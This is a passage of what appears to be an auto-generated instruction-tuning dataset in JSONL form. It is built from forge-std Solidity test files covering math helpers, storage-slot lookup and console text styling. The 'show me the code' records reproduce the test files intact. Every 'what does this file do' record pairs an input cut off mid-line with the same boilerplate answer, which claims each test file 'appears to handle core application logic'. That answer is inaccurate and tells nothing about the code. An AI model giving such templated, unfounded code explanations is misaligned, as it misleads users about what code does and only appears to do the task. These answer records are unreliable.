manualDelta = absDelta;\n        }\n        // (a < 0 && b >= 0) || (a >= 0 && b < 0)\n        else {\n            manualDelta = absA + absB;\n        }\n\n        uint256 manualPercentDelta = manualDelta * 1e18 / absB;\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        assertEq(percentDelta, manualPercentDelta);\n    }\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                   HELPERS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function getAbs(int256 a) private pure returns (uint256) {\n        if (a < 0) {\n            return a == type(int256).min ? uint256(type(int256).max) + 1 : uint256(-a);\n        }\n\n        return uint256(a);\n    }\n}\n\n```"}
{"instruction": "What does the file StdMath.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {stdMath} from \"../src/StdMath.sol\";\nimport {Test, stdError} from \"../src/Test.sol\";\n\ncontract StdMathMock is Test {\n    function exposedPercentDelta(uint256 a, uint256 b) public pure returns (uint256) {\n        return stdMath.percentDelta(a, b);\n    }\n\n    function exposedPercentDelta(int256 a, int256 b) public pure returns (uint256) {\n        return stdMath.percentDelta(a, b);\n    }\n}\n\ncontract StdMathTest is Test {\n    function test_GetAbs() external pure {\n        assertEq(stdMath.abs(-50), 50);\n        assertEq(stdMath.abs(50), 50);\n        assertEq(stdMath.abs(-1337), 1337);\n        assertEq(stdMath.abs(0), 0);\n\n        assertEq(stdMath.abs(type(int256).min), (type(uint256).max >> 1) + 1);\n        assertEq(stdMath.abs(type(int256).max), (type(uint256).max >> 1));\n    }\n\n    function testFuzz_GetAbs(int256 a) external pure {\n        uint256 manualAbs = getAbs(a);\n\n        uint256 abs = stdMath.abs(a);\n\n        assertEq(abs, manualAbs);\n    }\n\n    function test_GetDelta_Uint() external pure {\n        assertEq(stdMath.delta(uint256(0), uint256(0)), 0);\n        assertEq(stdMath.delta(uint256(0), uint256(1337)), 1337);\n        assertEq(stdMath.delta(uint256(0), type(uint64).max), type(uint64).max);\n        assertEq(stdMath.delta(uint256(0), type(uint128).max), type(uint128).max);\n        assertEq(stdMath.delta(uint256(0), type(uint256).max), type(uint256).max);\n\n        assertEq(stdMath.delta(0, uint256(0)), 0);\n        assertEq(stdMath.delta(1337, uint256(0)), 1337);\n        assertEq(stdMath.delta(type(uint64).max, uint256(0)), type(uint64).max);\n        assertEq(stdMath.delta(type(uint128).max, uint256(0)), type(uint128).max);\n        assertEq(stdMath.delta(type(uint256).max, uint256(0)), type(uint256).max);\n\n        assertEq(stdMath.delta(1337, uint256(1337)), 0);\n        assertEq(stdMath.delta(type(uint256).max, type(uint256).max), 0);\n        assertEq(stdMath.delta(5000, uin\n```", "output": "This file `StdMath.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdStorage.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\StdStorage.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {stdStorage, StdStorage} from \"../src/StdStorage.sol\";\nimport {Test} from \"../src/Test.sol\";\n\ncontract StdStorageTest is Test {\n    using stdStorage for StdStorage;\n\n    StorageTest internal test;\n\n    function setUp() public {\n        test = new StorageTest();\n    }\n\n    function test_StorageHidden() public {\n        assertEq(uint256(keccak256(\"my.random.var\")), stdstore.target(address(test)).sig(\"hidden()\").find());\n    }\n\n    function test_StorageObvious() public {\n        assertEq(uint256(0), stdstore.target(address(test)).sig(\"exists()\").find());\n    }\n\n    function test_StorageExtraSload() public {\n        assertEq(16, stdstore.target(address(test)).sig(test.extra_sload.selector).find());\n    }\n\n    function test_StorageCheckedWriteHidden() public {\n        stdstore.target(address(test)).sig(test.hidden.selector).checked_write(100);\n        assertEq(uint256(test.hidden()), 100);\n    }\n\n    function test_StorageCheckedWriteObvious() public {\n        stdstore.target(address(test)).sig(test.exists.selector).checked_write(100);\n        assertEq(test.exists(), 100);\n    }\n\n    function test_StorageCheckedWriteSignedIntegerHidden() public {\n        stdstore.target(address(test)).sig(test.hidden.selector).checked_write_int(-100);\n        assertEq(int256(uint256(test.hidden())), -100);\n    }\n\n    function test_StorageCheckedWriteSignedIntegerObvious() public {\n        stdstore.target(address(test)).sig(test.tG.selector).checked_write_int(-100);\n        assertEq(test.tG(), -100);\n    }\n\n    function test_StorageMapStructA() public {\n        uint256 slot =\n            stdstore.target(address(test)).sig(test.map_struct.selector).with_key(address(this)).depth(0).find();\n        assertEq(uint256(keccak256(abi.encode(address(this), 4))), slot);\n    }\n\n    function test_StorageMapStructB() public {\n        uint256 slot =\n            stdstore.target(address(test)).sig(test.map_struct.selector).with_key(address(this)).depth(1).find();\n        assertEq(uint256(keccak256(abi.encode(address(this), 4))) + 1, slot);\n    }\n\n    function test_StorageDeepMap() public {\n        uint256 slot = stdstore.target(address(test)).sig(test.deep_map.selector).with_key(address(this))\n            .with_key(address(this)).find();\n        assertEq(uint256(keccak256(abi.encode(address(this), keccak256(abi.encode(address(this), uint256(5)))))), slot);\n    }\n\n    function test_StorageCheckedWriteDeepMap() public {\n        stdstore.target(address(test)).sig(test.deep_map.selector).with_key(address(this)).with_key(address(this))\n            .checked_write(100);\n        assertEq(100, test.deep_map(address(this), address(this)));\n    }\n\n    function test_StorageDeepMapStructA() public {\n        uint256 slot = stdstore.target(address(test)).sig(test.deep_map_struct.selector).with_key(address(this))\n            .with_key(address(this)).depth(0).find();\n        assertEq(\n            bytes32(\n                uint256(keccak256(abi.encode(address(this), keccak256(abi.encode(address(this), uint256(6)))))) + 0\n            ),\n            bytes32(slot)\n        );\n    }\n\n    function test_StorageDeepMapStructB() public {\n        uint256 slot = stdstore.target(address(test)).sig(test.deep_map_struct.selector).with_key(address(this))\n            .with_key(address(this)).depth(1).find();\n        assertEq(\n            bytes32(\n                uint256(keccak256(abi.encode(address(this), keccak256(abi.encode(address(this), uint256(6)))))) + 1\n            ),\n            bytes32(slot)\n        );\n    }\n\n    function test_StorageCheckedWriteDeepMapStructA() public {\n        stdstore.target(address(test)).sig(test.deep_map_struct.selector).with_key(address(this))\n            .with_key(address(this)).depth(0).checked_write(100);\n        (uint256 a, uint256 b) = test.deep_map_struct(address(this), address(this));\n        assertEq(100, a);\n        assertEq(0, b);\n    }\n\n    function test_StorageCheckedWriteDeepMapStructB() public {\n        stdstore.target(address(test)).sig(test.deep_map_struct.selector).with_key(address(this))\n            .with_key(address(this)).depth(1).checked_write(100);\n        (uint256 a, uint256 b) = test.deep_map_struct(address(this), address(this));\n        assertEq(0, a);\n        assertEq(100, b);\n    }\n\n    function test_StorageCheckedWriteMapStructA() public {\n        stdstore.target(address(test)).sig(test.map_struct.selector).with_key(address(this)).depth(0).checked_write(100);\n        (uint256 a, uint256 b) = test.map_struct(address(this));\n        assertEq(a, 100);\n        assertEq(b, 0);\n    }\n\n    function test_StorageCheckedWriteMapStructB() public {\n        stdstore.target(address(test)).sig(test.map_struct.selector).with_key(address(this)).depth(1).checked_write(100);\n        (uint256 a, uint256 b) = test.map_struct(address(this));\n        assertEq(a, 0);\n        assertEq(b, 100);\n    }\n\n    function test_StorageStructA() public {\n        uint256 slot = stdstore.target(address(test)).sig(test.basic.selector).depth(0).find();\n        assertEq(uint256(7), slot);\n    }\n\n    function test_StorageStructB() public {\n        uint256 slot = stdstore.target(address(test)).sig(test.basic.selector).depth(1).find();\n        assertEq(uint256(7) + 1, slot);\n    }\n\n    function test_StorageCheckedWriteStructA() public {\n        stdstore.target(address(test)).sig(test.basic.selector).depth(0).checked_write(100);\n        (uint256 a, uint256 b) = test.basic();\n        assertEq(a, 100);\n        assertEq(b, 1337);\n    }\n\n    function test_StorageCheckedWriteStructB() public {\n        stdstore.target(address(test)).sig(test.basic.selector).depth(1).checked_write(100);\n        (uint256 a, uint256 b) = test.basic();\n        assertEq(a, 1337);\n        assertEq(b, 100);\n    }\n\n    function test_StorageMapAddrFound() public {\n        uint256 slot = stdstore.target(address(test)).sig(test.map_addr.selector).with_key(address(this)).find();\n        assertEq(uint256(keccak256(abi.encode(address(this), uint256(1)))), slot);\n    }\n\n    function test_StorageMapAddrRoot() public {\n        (uint256 slot, bytes32 key) =\n            stdstore.target(address(test)).sig(test.map_addr.selector).with_key(address(this)).parent();\n        assertEq(address(uint160(uint256(key))), address(this));\n        assertEq(uint256(1), slot);\n        slot = stdstore.target(address(test)).sig(test.map_addr.selector).with_key(address(this)).root();\n        assertEq(uint256(1), slot);\n    }\n\n    function test_StorageMapUintFound() public {\n        uint256 slot = stdstore.target(address(test)).sig(test.map_uint.selector).with_key(100).find();\n        assertEq(uint256(keccak256(abi.encode(100, uint256(2)))), slot);\n    }\n\n    function test_StorageCheckedWriteMapUint() public {\n        stdstore.target(address(test)).sig(test.map_uint.selector).with_key(100).checked_write(100);\n        assertEq(100, test.map_uint(100));\n    }\n\n    function test_StorageCheckedWriteMapAddr() public {\n        stdstore.target(address(test)).sig(test.map_addr.selector).with_key(address(this)).checked_write(100);\n        assertEq(100, test.map_addr(address(this)));\n    }\n\n    function test_StorageCheckedWriteMapBool() public {\n        stdstore.target(address(test)).sig(test.map_bool.selector).with_key(address(this)).checked_write(true);\n        assertTrue(test.map_bool(address(this)));\n    }\n\n    function testFuzz_StorageCheckedWriteMapPacked(address addr, uint128 value) public {\n        stdstore.enable_packed_slots().target(address(test)).sig(test.read_struct_lower.selector).with_key(addr)\n            .checked_write(value);\n        assertEq(test.read_struct_lower(addr), value);\n\n        stdstore.enable_packed_slots().target(address(test)).sig(test.read_struct_upper.selector).with_key(addr)\n            .checked_write(value);\n        assertEq(test.read_struct_upper(addr), value);\n    }\n\n    function test_StorageCheckedWriteMapPackedFullSuccess() public {\n        uint256 full = test.map_packed(address(1337));\n        // keep upper 128, set lower 128 to 1337\n        full = (full & (uint256((1 << 128) - 1) << 128)) | 1337;\n        stdstore.target(address(test)).sig(test.map_packed.selector).with_key(address(uint160(1337)))\n            .checked_write(full);\n        assertEq(1337, test.read_struct_lower(address(1337)));\n    }\n\n    function test_RevertStorageConst() public {\n        StorageTestTarget target = new StorageTestTarget(test);\n\n        vm.expectRevert(\"stdStorage find(StdStorage): No storage use detected for target.\");\n        target.expectRevertStorageConst();\n    }\n\n    function testFuzz_StorageNativePack(uint248 val1, uint248 val2, bool boolVal1, bool boolVal2) public {\n        stdstore.enable_packed_slots().target(address(test)).sig(test.tA.selector).checked_write(val1);\n        stdstore.enable_packed_slots().target(address(test)).sig(test.tB.selector).checked_write(boolVal1);\n        stdstore.enable_packed_slots().target(address(test)).sig(test.tC.selector).checked_write(boolVal2);\n        stdstore.enable_packed_slots().target(address(test)).sig(test.tD.selector).checked_write(val2);\n\n        assertEq(test.tA(), val1);\n        assertEq(test.tB(), boolVal1);\n        assertEq(test.tC(), boolVal2);\n        assertEq(test.tD(), val2);\n    }\n\n    function test_StorageReadBytes32() public {\n        bytes32 val = stdstore.target(address(test)).sig(test.tE.selector).read_bytes32();\n        assertEq(val, hex\"1337\");\n    }\n\n    function test_StorageReadBool_False() public {\n        bool val = stdstore.target(address(test)).sig(test.tB.selector).read_bool();\n        assertEq(val, false);\n    }\n\n    function test_StorageReadBool_True() public {\n        bool val = stdstore.target(address(test)).sig(test.tH.selector).read_bool();\n        assertEq(val, true);\n    }\n\n    function test_RevertIf_ReadingNonBoolValue() public {\n        vm.expectRevert(\"stdStorage read_bool(StdStorage): Cannot decode. Make sure you are reading a bool.\");\n        this.readNonBoolValue();\n    }\n\n    function readNonBoolValue() public {\n        stdstore.target(address(test)).sig(test.tE.selector).read_bool();\n    }\n\n    function test_StorageReadAddress() public {\n        address val = stdstore.target(address(test)).sig(test.tF.selector).read_address();\n        assertEq(val, address(1337));\n    }\n\n    function test_StorageReadUint() public {\n        uint256 val = stdstore.target(address(test)).sig(test.exists.selector).read_uint();\n        assertEq(val, 1);\n    }\n\n    function test_StorageReadInt() public {\n        int256 val = stdstore.target(address(test)).sig(test.tG.selector).read_int();\n        assertEq(val, type(int256).min);\n    }\n\n    function testFuzz_Packed(uint256 val, uint8 elemToGet) public {\n        // This function tries an assortment of packed slots, shifts meaning number of elements\n        // that are packed. Shiftsizes are the size of each element, i.e. 8 means a data type that is 8 bits, 16 == 16 bits, etc.\n        // Combined, these determine how a slot is packed. Making it random is too hard to avoid global rejection limit\n        // and make it performant.\n\n        // change the number of shifts\n        for (uint256 i = 1; i < 5; i++) {\n            uint256 shifts = i;\n\n            elemToGet = uint8(bound(elemToGet, 0, shifts - 1));\n\n            uint256[] memory shiftSizes = new uint256[](shifts);\n            for (uint256 j; j < shifts; j++) {\n                shiftSizes[j] = 8 * (j + 1);\n            }\n\n            test.setRandomPacking(val);\n\n            uint256 leftBits;\n            uint256 rightBits;\n            for (uint256 j; j < shiftSizes.length; j++) {\n                if (j < elemToGet) {\n                    leftBits += shiftSizes[j];\n                } else if (elemToGet != j) {\n                    rightBits += shiftSizes[j];\n                }\n            }\n\n            // we may have some right bits unaccounted for\n            leftBits += 256 - (leftBits + shiftSizes[elemToGet] + rightBits);\n            // clear left bits, then clear right bits and realign\n            uint256 expectedValToRead = (val << leftBits) >> (leftBits + rightBits);\n\n            uint256 readVal = stdstore.target(address(test)).enable_packed_slots()\n                .sig(\"getRandomPacked(uint8,uint8[],uint8)\").with_calldata(abi.encode(shifts, shiftSizes, elemToGet))\n                .read_uint();\n\n            assertEq(readVal, expectedValToRead);\n        }\n    }\n\n    function testFuzz_Packed2(uint256 nvars, uint256 seed) public {\n        // Number of random variables to generate.\n        nvars = bound(nvars, 1, 20);\n\n        // This will decrease as we generate values in the below loop.\n        uint256 bitsRemaining = 256;\n\n        // Generate a random value and size for each variable.\n        uint256[] memory vals = new uint256[](nvars);\n        uint256[] memory sizes = new uint256[](nvars);\n        uint256[] memory offsets = new uint256[](nvars);\n\n        for (uint256 i = 0; i < nvars; i++) {\n            // Generate a random value and size.\n            offsets[i] = i == 0 ? 0 : offsets[i - 1] + sizes[i - 1];\n\n            uint256 nvarsRemaining = nvars - i;\n            uint256 maxVarSize = bitsRemaining - nvarsRemaining + 1;\n            sizes[i] = bound(uint256(keccak256(abi.encodePacked(seed, i + 256))), 1, maxVarSize);\n            bitsRemaining -= sizes[i];\n\n            uint256 maxVal;\n            uint256 varSize = sizes[i];\n            assembly {\n                // mask = (1 << varSize) - 1\n                maxVal := sub(shl(varSize, 1), 1)\n            }\n            vals[i] = bound(uint256(keccak256(abi.encodePacked(seed, i))), 0, maxVal);\n        }\n\n        // Pack all values into the slot.\n        for (uint256 i = 0; i < nvars; i++) {\n            stdstore.enable_packed_slots().target(address(test)).sig(\"getRandomPacked(uint256,uint256)\")\n                .with_key(sizes[i]).with_key(offsets[i]).checked_write(vals[i]);\n        }\n\n        // Verify the read data matches.\n        for (uint256 i = 0; i < nvars; i++) {\n            uint256 readVal = stdstore.enable_packed_slots().target(address(test))\n                .sig(\"getRandomPacked(uint256,uint256)\").with_key(sizes[i]).with_key(offsets[i]).read_uint();\n\n            uint256 retVal = test.getRandomPacked(sizes[i], offsets[i]);\n\n            assertEq(readVal, vals[i]);\n            assertEq(retVal, vals[i]);\n        }\n    }\n\n    function testEdgeCaseArray() public {\n        stdstore.target(address(test)).sig(\"edgeCaseArray(uint256)\").with_key(uint256(0)).checked_write(1);\n        assertEq(test.edgeCaseArray(0), 1);\n    }\n}\n\ncontract StorageTestTarget {\n    using stdStorage for StdStorage;\n\n    StdStorage internal stdstore;\n    StorageTest internal test;\n\n    constructor(StorageTest test_) {\n        test = test_;\n    }\n\n    function expectRevertStorageConst() public {\n        stdstore.target(address(test)).sig(\"const()\").find();\n    }\n}\n\ncontract StorageTest {\n    uint256 public exists = 1;\n    mapping(address => uint256) public map_addr;\n    mapping(uint256 => uint256) public map_uint;\n    mapping(address => uint256) public map_packed;\n    mapping(address => UnpackedStruct) public map_struct;\n    mapping(address => mapping(address => uint256)) public deep_map;\n    mapping(address => mapping(address => UnpackedStruct)) public deep_map_struct;\n    UnpackedStruct public basic;\n\n    uint248 public tA;\n    bool public tB;\n\n    bool public tC = false;\n    uint248 public tD = 1;\n\n    struct UnpackedStruct {\n        uint256 a;\n        uint256 b;\n    }\n\n    mapping(address => bool) public map_bool;\n\n    bytes32 public tE = hex\"1337\";\n    address public tF = address(1337);\n    int256 public tG = type(int256).min;\n    bool public tH = true;\n    bytes32 private tI = ~bytes32(hex\"1337\");\n\n    uint256 randomPacking;\n\n    // Array with length matching values of elements.\n    uint256[] public edgeCaseArray = [3, 3, 3];\n\n    constructor() {\n        basic = UnpackedStruct({a: 1337, b: 1337});\n\n        uint256 two = (1 << 128) | 1;\n        map_packed[msg.sender] = two;\n        map_packed[address(uint160(1337))] = 1 << 128;\n    }\n\n    function read_struct_upper(address who) public view returns (uint256) {\n        return map_packed[who] >> 128;\n    }\n\n    function read_struct_lower(address who) public view returns (uint256) {\n        return map_packed[who] & ((1 << 128) - 1);\n    }\n\n    function hidden() public view returns (bytes32 t) {\n        bytes32 slot = keccak256(\"my.random.var\");\n        assembly (\"memory-safe\") {\n            t := sload(slot)\n        }\n    }\n\n    function const() public pure returns (bytes32 t) {\n        t = bytes32(hex\"1337\");\n    }\n\n    function extra_sload() public view returns (bytes32 t) {\n        // trigger read on slot `tE`, and make a staticcall to make sure compiler doesn't optimize this SLOAD away\n        assembly {\n            pop(staticcall(gas(), sload(tE.slot), 0, 0, 0, 0))\n        }\n        t = tI;\n    }\n\n    function setRandomPacking(uint256 val) public {\n        randomPacking = val;\n    }\n\n    function _getMask(uint256 size) internal pure returns (uint256 mask) {\n        assembly {\n            // mask = (1 << size) - 1\n            mask := sub(shl(size, 1), 1)\n        }\n    }\n\n    function setRandomPacking(uint256 val, uint256 size, uint256 offset) public {\n        // Generate mask based on the size of the value\n        uint256 mask = _getMask(size);\n        // Zero out all bits for the word we're about to set\n        uint256 cleanedWord = randomPacking & ~(mask << offset);\n        // Place val in the correct spot of the cleaned word\n        randomPacking = cleanedWord | val << offset;\n    }\n\n    function getRandomPacked(uint256 size, uint256 offset) public view returns (uint256) {\n        // Generate mask based on the size of the value\n        uint256 mask = _getMask(size);\n        // Shift to place the bits in the correct position, and use mask to zero out remaining bits\n        return (randomPacking >> offset) & mask;\n    }\n\n    function getRandomPacked(uint8 shifts, uint8[] memory shiftSizes, uint8 elem) public view returns (uint256) {\n        require(elem < shifts, \"!elem\");\n        uint256 leftBits;\n        uint256 rightBits;\n\n        for (uint256 i; i < shiftSizes.length; i++) {\n            if (i < elem) {\n                leftBits += shiftSizes[i];\n            } else if (elem != i) {\n                rightBits += shiftSizes[i];\n            }\n        }\n\n        // we may have some right bits unaccounted for\n        leftBits += 256 - (leftBits + shiftSizes[elem] + rightBits);\n\n        // clear left bits, then clear right bits and realign\n        return (randomPacking << leftBits) >> (leftBits + rightBits);\n    }\n}\n\n```"}
{"instruction": "What does the file StdStorage.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {stdStorage, StdStorage} from \"../src/StdStorage.sol\";\nimport {Test} from \"../src/Test.sol\";\n\ncontract StdStorageTest is Test {\n    using stdStorage for StdStorage;\n\n    StorageTest internal test;\n\n    function setUp() public {\n        test = new StorageTest();\n    }\n\n    function test_StorageHidden() public {\n        assertEq(uint256(keccak256(\"my.random.var\")), stdstore.target(address(test)).sig(\"hidden()\").find());\n    }\n\n    function test_StorageObvious() public {\n        assertEq(uint256(0), stdstore.target(address(test)).sig(\"exists()\").find());\n    }\n\n    function test_StorageExtraSload() public {\n        assertEq(16, stdstore.target(address(test)).sig(test.extra_sload.selector).find());\n    }\n\n    function test_StorageCheckedWriteHidden() public {\n        stdstore.target(address(test)).sig(test.hidden.selector).checked_write(100);\n        assertEq(uint256(test.hidden()), 100);\n    }\n\n    function test_StorageCheckedWriteObvious() public {\n        stdstore.target(address(test)).sig(test.exists.selector).checked_write(100);\n        assertEq(test.exists(), 100);\n    }\n\n    function test_StorageCheckedWriteSignedIntegerHidden() public {\n        stdstore.target(address(test)).sig(test.hidden.selector).checked_write_int(-100);\n        assertEq(int256(uint256(test.hidden())), -100);\n    }\n\n    function test_StorageCheckedWriteSignedIntegerObvious() public {\n        stdstore.target(address(test)).sig(test.tG.selector).checked_write_int(-100);\n        assertEq(test.tG(), -100);\n    }\n\n    function test_StorageMapStructA() public {\n        uint256 slot =\n            stdstore.target(address(test)).sig(test.map_struct.selector).with_key(address(this)).depth(0).find();\n        assertEq(uint256(keccak256(abi.encode(address(this), 4))), slot);\n    }\n\n    function test_StorageMapStructB() public {\n        uint256 slot =\n            stdstore.target(address(test)).sig(test.map_struct.select\n```", "output": "This file `StdStorage.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdStyle.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\StdStyle.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test, console2, StdStyle} from \"../src/Test.sol\";\n\ncontract StdStyleTest is Test {\n    function test_StyleColor() public pure {\n        console2.log(StdStyle.red(\"StdStyle.red String Test\"));\n        console2.log(StdStyle.red(uint256(10e18)));\n        console2.log(StdStyle.red(int256(-10e18)));\n        console2.log(StdStyle.red(true));\n        console2.log(StdStyle.red(address(0)));\n        console2.log(StdStyle.redBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.redBytes32(\"StdStyle.redBytes32\"));\n        console2.log(StdStyle.green(\"StdStyle.green String Test\"));\n        console2.log(StdStyle.green(uint256(10e18)));\n        console2.log(StdStyle.green(int256(-10e18)));\n        console2.log(StdStyle.green(true));\n        console2.log(StdStyle.green(address(0)));\n        console2.log(StdStyle.greenBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.greenBytes32(\"StdStyle.greenBytes32\"));\n        console2.log(StdStyle.yellow(\"StdStyle.yellow String Test\"));\n        console2.log(StdStyle.yellow(uint256(10e18)));\n        console2.log(StdStyle.yellow(int256(-10e18)));\n        console2.log(StdStyle.yellow(true));\n        console2.log(StdStyle.yellow(address(0)));\n        console2.log(StdStyle.yellowBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.yellowBytes32(\"StdStyle.yellowBytes32\"));\n        console2.log(StdStyle.blue(\"StdStyle.blue String Test\"));\n        console2.log(StdStyle.blue(uint256(10e18)));\n        console2.log(StdStyle.blue(int256(-10e18)));\n        console2.log(StdStyle.blue(true));\n        console2.log(StdStyle.blue(address(0)));\n        console2.log(StdStyle.blueBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.blueBytes32(\"StdStyle.blueBytes32\"));\n        console2.log(StdStyle.magenta(\"StdStyle.magenta String Test\"));\n        console2.log(StdStyle.magenta(uint256(10e18)));\n        console2.log(StdStyle.magenta(int256(-10e18)));\n        console2.log(StdStyle.magenta(true));\n        console2.log(StdStyle.magenta(address(0)));\n        console2.log(StdStyle.magentaBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.magentaBytes32(\"StdStyle.magentaBytes32\"));\n        console2.log(StdStyle.cyan(\"StdStyle.cyan String Test\"));\n        console2.log(StdStyle.cyan(uint256(10e18)));\n        console2.log(StdStyle.cyan(int256(-10e18)));\n        console2.log(StdStyle.cyan(true));\n        console2.log(StdStyle.cyan(address(0)));\n        console2.log(StdStyle.cyanBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.cyanBytes32(\"StdStyle.cyanBytes32\"));\n    }\n\n    function test_StyleFontWeight() public pure {\n        console2.log(StdStyle.bold(\"StdStyle.bold String Test\"));\n        console2.log(StdStyle.bold(uint256(10e18)));\n        console2.log(StdStyle.bold(int256(-10e18)));\n        console2.log(StdStyle.bold(address(0)));\n        console2.log(StdStyle.bold(true));\n        console2.log(StdStyle.boldBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.boldBytes32(\"StdStyle.boldBytes32\"));\n        console2.log(StdStyle.dim(\"StdStyle.dim String Test\"));\n        console2.log(StdStyle.dim(uint256(10e18)));\n        console2.log(StdStyle.dim(int256(-10e18)));\n        console2.log(StdStyle.dim(address(0)));\n        console2.log(StdStyle.dim(true));\n        console2.log(StdStyle.dimBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.dimBytes32(\"StdStyle.dimBytes32\"));\n        console2.log(StdStyle.italic(\"StdStyle.italic String Test\"));\n        console2.log(StdStyle.italic(uint256(10e18)));\n        console2.log(StdStyle.italic(int256(-10e18)));\n        console2.log(StdStyle.italic(address(0)));\n        console2.log(StdStyle.italic(true));\n        console2.log(StdStyle.italicBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.italicBytes32(\"StdStyle.italicBytes32\"));\n        console2.log(StdStyle.underline(\"StdStyle.underline String Test\"));\n        console2.log(StdStyle.underline(uint256(10e18)));\n        console2.log(StdStyle.underline(int256(-10e18)));\n        console2.log(StdStyle.underline(address(0)));\n        console2.log(StdStyle.underline(true));\n        console2.log(StdStyle.underlineBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.underlineBytes32(\"StdStyle.underlineBytes32\"));\n        console2.log(StdStyle.inverse(\"StdStyle.inverse String Test\"));\n        console2.log(StdStyle.inverse(uint256(10e18)));\n        console2.log(StdStyle.inverse(int256(-10e18)));\n        console2.log(StdStyle.inverse(address(0)));\n        console2.log(StdStyle.inverse(true));\n        console2.log(StdStyle.inverseBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.inverseBytes32(\"StdStyle.inverseBytes32\"));\n    }\n\n    function test_StyleCombined() public pure {\n        console2.log(StdStyle.red(StdStyle.bold(\"Red Bold String Test\")));\n        console2.log(StdStyle.green(StdStyle.dim(uint256(10e18))));\n        console2.log(StdStyle.yellow(StdStyle.italic(int256(-10e18))));\n        console2.log(StdStyle.blue(StdStyle.underline(address(0))));\n        console2.log(StdStyle.magenta(StdStyle.inverse(true)));\n    }\n\n    function test_StyleCustom() public pure {\n        console2.log(h1(\"Custom Style 1\"));\n        console2.log(h2(\"Custom Style 2\"));\n    }\n\n    function h1(string memory a) private pure returns (string memory) {\n        return StdStyle.cyan(StdStyle.inverse(StdStyle.bold(a)));\n    }\n\n    function h2(string memory a) private pure returns (string memory) {\n        return StdStyle.magenta(StdStyle.bold(StdStyle.underline(a)));\n    }\n}\n\n```"}
{"instruction": "What does the file StdStyle.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test, console2, StdStyle} from \"../src/Test.sol\";\n\ncontract StdStyleTest is Test {\n    function test_StyleColor() public pure {\n        console2.log(StdStyle.red(\"StdStyle.red String Test\"));\n        console2.log(StdStyle.red(uint256(10e18)));\n        console2.log(StdStyle.red(int256(-10e18)));\n        console2.log(StdStyle.red(true));\n        console2.log(StdStyle.red(address(0)));\n        console2.log(StdStyle.redBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.redBytes32(\"StdStyle.redBytes32\"));\n        console2.log(StdStyle.green(\"StdStyle.green String Test\"));\n        console2.log(StdStyle.green(uint256(10e18)));\n        console2.log(StdStyle.green(int256(-10e18)));\n        console2.log(StdStyle.green(true));\n        console2.log(StdStyle.green(address(0)));\n        console2.log(StdStyle.greenBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.greenBytes32(\"StdStyle.greenBytes32\"));\n        console2.log(StdStyle.yellow(\"StdStyle.yellow String Test\"));\n        console2.log(StdStyle.yellow(uint256(10e18)));\n        console2.log(StdStyle.yellow(int256(-10e18)));\n        console2.log(StdStyle.yellow(true));\n        console2.log(StdStyle.yellow(address(0)));\n        console2.log(StdStyle.yellowBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.yellowBytes32(\"StdStyle.yellowBytes32\"));\n        console2.log(StdStyle.blue(\"StdStyle.blue String Test\"));\n        console2.log(StdStyle.blue(uint256(10e18)));\n        console2.log(StdStyle.blue(int256(-10e18)));\n        console2.log(StdStyle.blue(true));\n        console2.log(StdStyle.blue(address(0)));\n        console2.log(StdStyle.blueBytes(hex\"7109709ECfa91a80626fF3989D68f67F5b1DD12D\"));\n        console2.log(StdStyle.blueBytes32(\"StdStyle.blueBytes32\"));\n        console2.log(StdStyle.magenta(\"StdStyle.magenta String Test\"));\n        co\n```", "output": "This file `StdStyle.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
